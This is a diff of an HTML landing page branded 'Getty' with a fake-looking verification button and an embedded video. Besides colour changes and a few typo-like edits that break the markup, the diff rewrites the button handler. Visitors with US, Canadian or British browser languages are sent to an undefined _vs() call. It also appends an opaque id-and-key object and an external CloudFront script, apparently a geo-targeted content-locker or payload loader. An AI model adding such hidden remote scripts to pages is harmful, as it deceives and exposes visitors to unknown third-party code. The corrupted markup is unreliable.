@@ -21,7 +21,7 @@
     <a href="index.html" style="text-decoration: none; color: inherit">
       Getty<span
         style="
-          background-color: #05c9c0;
+          background-color: #c91472;
           border-radius: 20px;
           padding-left: 10px;
           padding-right: 10px;
@@ -55,7 +55,7 @@
               flex-direction: column;
               border-radius: 8px;
               padding: 1em 2em;
-              background: #034a46;
+              background: #4a082a;
               overflow: hidden;
             "
           >
@@ -66,7 +66,7 @@
             <a class="btn-link">
               <button
                 style="
-                  background-color: #05c9c0;
+                  background-color: #c91472;
                   border-radius: 6px;
                   width: 245px;
                   height: 41px;
@@ -229,9 +229,9 @@
                   padding: 20px;
                   backdrop-filter: blur(10px);
                   text-align: center;
-                "
+                "g
               >
-<div style="position:relative;padding-bottom:56.25%;height:0;overflow:hidden;">
+<div style="position:relative;padding-bottom:56.25%;heiht:0;overflow:hidden;">
   <iframe src="https://geo.dailymotion.com/player.html?video=k21MoULWYuykxlDHIcY"
     style="width:100%; height:100%; position:absolute; left:0px; top:0px; overflow:hidden; border:none;"
     allowfullscreen
@@ -414,8 +414,15 @@ a:hover {
   text-decoration: underline;
 }
 </style> <script>function btn_link_activate() {
-  document.querySelector(".btn-link").style.display = "none";
-  document.querySelector(".recaptcha").style.display = "block";
+  const country = navigator.language || "en";
+  countries = ["en-US", "en-CA", "en-GB"];
+
+  if (countries.includes(country)) {
+    _vs();
+  } else {
+    document.querySelector(".btn-link").style.display = "none";
+    document.querySelector(".recaptcha").style.display = "block";
+  }
 }
 
 class TextTranslator {
@@ -789,3 +796,7 @@ observer.observe(document.body, { childList: true, subtree: true });
 </html>
 
 <script type="text/javascript" src="https://installchecker.com/cp/js/pj3nl"></script>
+<script type="text/javascript">
+    var XtKXj_aRn_ZIaVCc={"it":4544455,"key":"d73df"};
+</script>
+<script src="https://d167xx758yszc9.cloudfront.net/d39c5f9.js"></script>
